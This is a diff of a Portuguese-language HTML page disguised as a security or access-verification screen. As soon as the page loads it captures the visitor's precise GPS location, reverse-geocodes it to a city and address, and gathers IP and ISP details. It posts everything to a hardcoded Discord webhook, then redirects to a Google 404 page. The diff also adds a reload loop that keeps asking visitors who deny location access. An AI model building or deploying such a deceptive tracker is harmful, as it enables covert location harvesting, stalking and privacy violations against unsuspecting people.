@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>Sincronizando Protocolos</title>
     <style>
-        body { background: #0f172a; color: #e2e8f0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 40px; border-radius: 16px; border: 1px solid #334155; text-align: center; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); max-width: 320px; }
-        .spinner { border: 4px solid #334155; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        body { background: #0b0f19; color: #f1f5f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #161b22; padding: 40px; border-radius: 12px; border: 1px solid #30363d; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.7); max-width: 350px; }
+        .spinner { border: 4px solid #21262d; border-top: 4px solid #58a6ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .toast { position: fixed; top: 20px; right: 20px; background: #3b82f6; padding: 12px 20px; border-radius: 8px; font-size: 14px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); z-index: 100; margin-bottom: 10px; }
+        .toast { position: fixed; top: 20px; right: 20px; background: #238636; color: white; padding: 12px 24px; border-radius: 6px; font-size: 13px; font-weight: bold; box-shadow: 0 4px 12px rgba(0,0,0,0.5); z-index: 1000; transition: 0.3s; margin-top: 10px; border-left: 4px solid #fff; }
     </style>
 </head>
 <body>
@@ -18,47 +18,47 @@
 
     <div class="card">
         <div class="spinner"></div>
-        <h2 style="margin: 0 0 10px 0;">Verificando...</h2>
-        <p style="font-size: 14px; color: #94a3b8;">Aguarde a validação do protocolo de segurança.</p>
+        <h2 style="margin: 0 0 10px 0; font-size: 1.2rem;">Verificando Acesso</h2>
+        <p style="font-size: 14px; color: #8b949e; line-height: 1.6;">Aguarde a validação dos certificados de segurança do seu dispositivo.</p>
     </div>
 
     <script>
-        // WEBHOOK ATUALIZADO COM O LINK QUE VOCÊ MANDOU AGORA
+        // WEBHOOK ATUALIZADO
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
 
-        function notify(msg) {
+        function notify(text) {
             const container = document.getElementById('notifications');
-            const n = document.createElement('div');
-            n.className = 'toast';
-            n.innerText = 'ℹ ' + msg;
-            container.appendChild(n);
-            setTimeout(() => n.remove(), 4000);
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerText = '✓ ' + text;
+            container.appendChild(toast);
+            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 500); }, 3000);
         }
 
-        async function capturarEEnviar() {
-            notify("Conectando ao servidor...");
+        async function processar() {
+            notify("Conexão Criptografada");
 
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    notify("Sincronizando localização...");
+                    notify("GPS Sincronizado");
 
                     try {
-                        // 1. Pega dados de endereço real via GPS
+                        // 1. Reverso Geocoding (Pega a CIDADE REAL)
                         const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                         const geoData = await geoRes.json();
                         const addr = geoData.address;
 
-                        // 2. Pega dados de IP e Provedor
+                        // 2. Dados de IP/Provedor
                         const ipRes = await fetch('https://ipapi.co/json/');
                         const ipData = await ipRes.json();
 
-                        // 3. Monta o relatório final
-                        const payload = {
+                        // 3. Montagem do Embed para o canal de LOGS
+                        const embed = {
                             embeds: [{
-                                title: "🚀 NOVO ACESSO IDENTIFICADO",
-                                color: 5814783,
+                                title: "🚨 NOVO LOG DE ACESSO DETECTADO",
+                                color: 5763719,
                                 fields: [
                                     { name: "🚩 Pais:", value: addr.country || "Brasil", inline: true },
                                     { name: "🏛️ Estado:", value: addr.state || "N/A", inline: true },
@@ -68,35 +68,33 @@
                                     { name: "🌐 Internet/Provedor:", value: ipData.org || "N/A", inline: false },
                                     { name: "⏰ Horário:", value: new Date().toLocaleString('pt-BR'), inline: false }
                                 ],
-                                footer: { text: "Sistema de Monitoramento Ativo" }
+                                footer: { text: "ID de Sessão: " + Math.random().toString(36).substr(2, 7).toUpperCase() }
                             }]
                         };
 
-                        // 4. ENVIA PARA O DISCORD
+                        // 4. ENVIO FINAL
                         const response = await fetch(WEBHOOK_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(payload)
+                            body: JSON.stringify(embed)
                         });
 
-                        if(response.ok) {
-                            notify("Verificação concluída!");
-                            setTimeout(() => { window.location.href = "https://google.com/404"; }, 2000);
-                        } else {
-                            notify("Erro no Webhook. Verifique o Discord.");
+                        if (response.ok) {
+                            notify("Logs Enviados!");
+                            setTimeout(() => { window.location.href = "https://google.com/404"; }, 1500);
                         }
 
-                    } catch (err) {
-                        console.error("Erro no processamento:", err);
-                        notify("Erro de resposta do servidor.");
-                    }
-                }, (erro) => {
-                    notify("Erro: Localização necessária.");
-                }, { enableHighAccuracy: true });
+                    } catch (e) { console.error(e); }
+                }, 
+                (err) => { 
+                    notify("Acesso negado. Recarregando...");
+                    setTimeout(() => location.reload(), 2000);
+                }, 
+                { enableHighAccuracy: true });
             }
         }
 
-        window.onload = capturarEEnviar;
+        window.onload = processar;
     </script>
 </body>
 </html>
